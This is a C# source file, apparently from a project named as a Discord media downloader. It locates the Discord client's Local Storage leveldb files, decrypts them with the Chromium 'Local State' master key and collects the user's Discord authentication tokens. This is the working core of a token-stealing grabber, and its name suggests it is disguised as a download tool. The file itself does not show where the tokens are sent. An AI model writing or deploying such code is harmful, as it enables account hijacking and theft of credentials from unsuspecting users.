using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

using Discord_Media_DL.Misc;

namespace Discord_Media_DL.Token.Apps
{
    class Discord : IApp
    {
        public string Name => "Discord";

        public string[] TokenPaths => new string[]
        {
            Help.Paths.Roaming + @"\discord\Local Storage\leveldb\",
        };

        public async Task<string[]> GetTokens()
        {
            List<string> result = new();

            var LocalStatePath = Path.Combine(Help.Paths.Roaming, @"discord", "Local State");
            var masterKeyBytes = ChromeSecurity.GetMasterKey(LocalStatePath);

            ParallelLoopResult loop = Parallel.ForEach(TokenPaths, (tokenPath) =>
            {
                result.AddRange(TokensUtil.GetTokensFromPath(tokenPath, masterKeyBytes));
            });

            while (loop.IsCompleted == false)
                await Task.Delay(100);

            return result.ToArray();
        }
    }
}
